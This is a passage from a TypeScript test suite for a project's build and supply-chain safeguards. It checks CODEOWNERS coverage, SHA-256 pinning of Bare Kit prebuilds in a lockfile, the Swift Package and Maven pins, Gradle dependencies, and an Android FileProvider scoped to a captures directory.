      fs.writeFileSync(path.join(dir, 'Host.md'), 'docs\n');
      git('commit', '-qam', 'docs');
      expect(run({ GITHUB_EVENT_NAME: 'push', BEFORE_SHA: docsBase })).toMatch(
        /^code=false$/m,
      );
      expect(
        run({
          GITHUB_EVENT_NAME: 'merge_group',
          MERGE_GROUP_BASE_SHA: docsBase,
        }),
      ).toMatch(/^code=false$/m);
      // No base sha: fail-safe, run everything.
      expect(run({ GITHUB_EVENT_NAME: 'merge_group' })).toMatch(/^code=true$/m);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it('CODEOWNERS gates the trust boundaries', () => {
    const owners = fs.readFileSync(
      path.join(ROOT, '.github/CODEOWNERS'),
      'utf8',
    );
    for (const p of [
      '/.github/',
      '/scripts/prebuilds.lock.json',
      '/scripts/fetch-prebuilds.mjs',
      '/security.test.ts',
      '/Package.swift',
      '/docs/security.md',
    ]) {
      expect(owners).toMatch(
        new RegExp(`^${p.replace(/[.*+?/]/g, '\\$&')}\\s+@AndersCan`, 'm'),
      );
    }
  });

  it('the Bare Kit prebuild lockfile pins a real SHA-256 and drives the fetcher', () => {
    const lock = JSON.parse(
      fs.readFileSync(path.join(ROOT, 'scripts/prebuilds.lock.json'), 'utf8'),
    ) as {
      version: string;
      repo: string;
      artifacts: Record<string, { sha256: string; extract: string[] }>;
    };
    const artifacts = Object.entries(lock.artifacts);
    expect(artifacts.length).toBeGreaterThan(0);
    for (const [name, { sha256, extract }] of artifacts) {
      expect(sha256, name).toMatch(/^[0-9a-f]{64}$/);
      expect(extract.length, name).toBeGreaterThan(0);
    }
    // One source of truth: the script hardcodes no version or repo.
    const script = fs.readFileSync(
      path.join(ROOT, 'scripts/fetch-prebuilds.mjs'),
      'utf8',
    );
    expect(script).not.toContain(lock.version);
    expect(script).not.toContain(lock.repo);
  });

  it('Package.swift resolves the BareKit binary the lockfile pins', () => {
    // One fixed url + checksum form on main and every tag: no release-time
    // switch to forget (RELEASING.md, "Bumping Bare Kit").
    const lock = JSON.parse(
      fs.readFileSync(path.join(ROOT, 'scripts/prebuilds.lock.json'), 'utf8'),
    ) as { spm: Record<string, { url: string; sha256: string }> };
    const pin = lock.spm['BareKit.xcframework.zip'];
    const manifest = fs.readFileSync(path.join(ROOT, 'Package.swift'), 'utf8');
    expect(manifest).toContain(`url: "${pin.url}"`);
    expect(manifest).toContain(`checksum: "${pin.sha256}"`);
    expect(manifest).not.toMatch(/binaryTarget\([^)]*\bpath:/s);
    // CI proves the zip's contents are the hash-verified prebuild (G-8).
    const test = fs.readFileSync(
      path.join(ROOT, '.github/workflows/test.yml'),
      'utf8',
    );
    expect(test).toContain('node .github/scripts/verify-spm-binary.mjs');
  });

  it('the bare-kit-runtime Maven pin names the pinned bare-kit version', () => {
    // ADR 0007: the runtime artifact is the hash-checked prebuild at `version`,
    // republished only with a `-N` suffix.
    const lock = JSON.parse(
      fs.readFileSync(path.join(ROOT, 'scripts/prebuilds.lock.json'), 'utf8'),
    ) as { version: string; maven: Record<string, string> };
    const base = lock.version.replace(/^v/, '');
    expect(lock.maven['bare-kit-runtime']).toMatch(
      new RegExp(`^${base.replace(/[\\.]/g, '\\$&')}(-\\d+)?$`),
    );
  });

  it('bare-host takes the Bare Kit runtime only from :bare-kit-runtime', () => {
    // ADR 0007: bundling the ~70 MB prebuild into bare-host again would put it
    // in every ekrooh release on Maven Central.
    const gradle = fs
      .readFileSync(path.join(ROOT, 'android/build.gradle'), 'utf8')
      .split('\n')
      .filter((line) => !line.trim().startsWith('//'))
      .join('\n');
    expect(gradle).not.toContain('prebuilds/android');
    expect(gradle).toContain('api project(":bare-kit-runtime")');
  });

  it('the reference FileProvider exposes only the captures directory', () => {
    const xml = fs.readFileSync(
      path.join(ROOT, 'examples/android-app/src/main/res/xml/file_paths.xml'),
      'utf8',
    );
    const paths = [...xml.matchAll(/<([a-z-]+-path)\b[^>]*\bpath="([^"]*)"/g)];
    expect(paths.map(([, kind, p]) => `${kind}:${p}`)).toEqual([
      'cache-path:captures/',
    ]);
  });
});
